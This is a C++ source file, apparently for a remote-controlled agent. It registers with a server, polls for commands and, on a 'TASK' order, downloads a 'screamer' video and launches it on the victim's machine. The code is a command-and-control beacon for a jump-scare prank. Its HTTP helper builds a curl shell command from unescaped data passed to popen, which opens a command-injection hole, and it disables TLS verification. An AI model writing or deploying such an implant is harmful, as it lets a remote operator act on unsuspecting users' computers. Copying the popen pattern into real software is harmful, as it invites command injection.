#include "agent.h"
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <cstdio>
#include <json.hpp>
#include <cstdlib>
#include "screamer_open.h"
#include "video_loader.h"

using json = nlohmann::json;
using std::string, std::cout;


void Agent::log(const string& msg) {
    std::ofstream("agent.log", std::ios::app) << msg << std::endl;
    cout << msg << std::endl;
}


string Agent::http_post(const string& url, const string& data) {
    string cmd = "curl -s -k -X POST -H \"Content-Type: application/json\" "
                      "-d \"" + data + "\" \"" + url + "\"";
    
    string result;
    FILE* pipe = popen(cmd.c_str(), "r");

    if (pipe) {
        char buf[256];
        while (fgets(buf, sizeof(buf), pipe)) result += buf;
        pclose(pipe);
    }
    return result;
}


Agent::Agent(const string& config_file) {
    std::ofstream("agent.log", std::ios::trunc).close();
    std::ifstream f(config_file);
    json cfg = json::parse(f);
    uid_ = cfg["uid"];
    server_uri_ = cfg["server_uri"];
    interval_ = cfg["request_interval"];
    
    log("Agent started, UID: " + uid_);
    std::ifstream code_file(".access_code_" + uid_);
    if (code_file.is_open()) {
        std::getline(code_file, access_code_);
        log("Loaded saved access code: " + access_code_);
    } else {
        log("Registering...");
        json req = {{"UID", uid_}, {"descr", "web-agent"}};
        string resp = http_post(server_uri_ + "wa_reg/", req.dump());
        log("Response: " + resp);
        
        try {
            auto resp_json = json::parse(resp);
            if (resp_json.contains("access_code")) {
                access_code_ = resp_json["access_code"];
                log("Access code: " + access_code_);
                
                std::ofstream(".access_code_" + uid_) << access_code_;
                log("Access code saved");
            }
        } catch(...) {
            log("Failed to parse response");
        }
    }
}



void Agent::run() {
    int poll = 0;
    int spros = 0;
    while (true) {
        spros++;
        poll++;
        log("Poll #" + std::to_string(poll));
        
        json req = {{"UID", uid_}, {"access_code", access_code_}};
        string resp = http_post(server_uri_ + "wa_task/", req.dump());
        log("Response: " + resp);
        
        try {
            auto task = json::parse(resp);
            int code = std::stoi(task["code_responce"].get<string>());
            
            if (code == 1) {
                spros = 0;
                log("TASK: " + task["task_code"].get<string>());
                log("Session: " + task["session_id"].get<string>());
                if (task["task_code"].get<string>() == "TASK") {
                    log("Starting running exe");
                    std::string video_url = "https://github.com/testerVsego/vid_for_agent/blob/main/screamer.mp4";
                    clear_resources();
                    load_vid(video_url, "screamer.mp4");
                    //update_video("screamer.mp4"); 
                    zapusk_exe();  
                    /*json result = {
                        {"UID", uid_},
                        {"access_code", access_code_},
                        {"message", "Video played"},
                        {"files", 0},
                        {"session_id", task["session_id"].get<std::string>()}
                    };
                    http_post(server_uri_ + "wa_result/", result.dump());*/
                }
                else if (task["task_code"].get<string>() == "CONF") {

                }
                else if (task["task_code"].get<string>() == "TIMEOUT") {
                    interval_ = std::stoi(task["options"].get<string>());
                }
                else if (task["task_code"].get<string>() == "FILE") {
                        
                }

            } else if (code == 0) {
                log("No tasks");
            } else {
                log("Error: " + std::to_string(code));
                if (task.contains("msg")) log("Msg: " + task["msg"].get<string>());
            }
        } catch(...) {
            log("Failed to parse response");
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(interval_));
        if (spros >= 20) {
            log("There have been no tasks for a long time, work is ending");
            break;
        }
    }
}